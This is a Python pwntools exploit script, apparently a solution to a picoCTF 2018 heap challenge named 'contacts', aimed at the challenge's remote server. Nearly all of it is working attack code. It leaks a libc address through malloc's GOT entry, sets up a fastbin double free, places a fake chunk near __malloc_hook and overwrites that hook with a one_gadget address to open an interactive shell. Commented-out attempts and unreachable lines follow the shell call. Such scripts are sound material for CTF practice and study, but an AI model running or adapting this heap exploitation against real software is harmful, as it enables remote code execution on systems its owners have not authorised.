from pwn import *
import struct
import re
from ctypes import *

context.terminal = ['tmux', 'splitw', '-h']

gdb_script = """
"""

class contact_s(Structure):
    _fields_ = [
            ('name', c_int64),
            ('bio', c_int64),
            ]
    def to_bytes(self):
        return buffer(self)[:]

class chunk_s(Structure):
    _fields_ = [
            ('prev_chunk_size', c_int64), # can be 0's
            ('chunk_size', c_int64), # last 3 bits are A 0 P, but all 3 can be 0
            ('next_ptr', c_int64), # points to __malloc_hook
            ('prev_ptr', c_int64) # last 3 bits are A 0 P, but all 3 can be 0
            ]
    def to_bytes(self):
        return buffer(self)[:]

# p = process('./contacts')
p = remote("2018shell.picoctf.com", 59572)
# gdb.attach(p, gdb_script)
e = ELF('./contacts')
libc = ELF('./libc.so.6')

def display():
    p.sendline("display")
    return p.recvuntil(">")

def create(name):
    print name
    p.sendline("create " + name)
    return p.recvuntil(">")

def delete(name):
    p.sendline("delete " + name)
    return p.recvuntil(">")

def bio(name, length, bio):
    p.sendline("bio " + name)
    print p.recvuntil("?")
    p.sendline(length)
    print length
    if bio != "":
        print p.recvuntil(":")
        p.sendline(bio)
    return p.recvuntil(">")

def quit():
    p.sendline("quit")
    return

payload = p64(e.got['malloc'])

#payload += '\x00'

print create('a')
print delete('a')
print create('a')
print bio('a', '16', 'aaaaaaaaaaaaaaaa')
print bio('a', '999999999999999', '')
print create('b')
print bio('a', '16', payload + payload)
p.recvuntil('>')
info = display()
malloc_addr = re.findall('.*- (.*)', info)[1]


libc_start = u64(malloc_addr.ljust(8,'\x00')) - libc.symbols['malloc']

print libc_start

#sys_addr = libc_start + libc.symbols['system']
sys_addr = libc_start + libc.symbols['__malloc_hook'] - 0x23

# addr 1 below 0xe1 (valid mem header)
payload = p64(0x602010)

print create('c')
print create('dummy')
print create('dummy1')
print create('dummy2')
print create('dummy3')
print create('dummy4')
#print create('dummy1')

one_gadget = libc_start + 0x4526a
bin_size = 0x60
payload = cyclic(bin_size)
print bio('c', str(len(payload)), payload)
print bio('dummy', str(len(payload)), payload)
print bio('c', '999', '') # c is cleared, free list: c
print bio('dummy', '999', '') # free list: dummy->c
print bio('c', '999', '') # c->dummy->c


#print create('cc') # chunk1 of free list (1->2->1->any)
#print delete('dummy1')
print bio('dummy1', str(bin_size), struct.pack("L",sys_addr)) # this returns c from free list, writes __malloc_hook to c struct
print bio('dummy2', str(len(payload)), payload) # returns dummy
print bio('dummy3', str(len(payload)), payload) # returns c, next chunk is __malloc_hook-0x23


# 0x13 bytes because first 16 bytes of 0x23 offset are prev_size and curr_size, so only need additional
# 0x13 offset to reach malloc_hook pointer location
print bio('dummy4', str(len(payload)), "\x00"*0x13+struct.pack("L",one_gadget)) # overwrites __malloc_hook

# print create('aaaaaaaaaaa')
p.interactive()
# p.recvuntil('>')
# info = display()
# got_addr = re.findall('.*- (.*)', info)[3]
# print got_addr
# print bio(got_addr, '30', '\x90'*22 + p64(sys_addr))


print p.recvuntil('>')
print p.recvuntil('>')
# print p.sendline('bio ' + malloc_addr)
# print p.recvuntil('?')

# print bio(malloc_addr, 8, libc.symbols['free'])
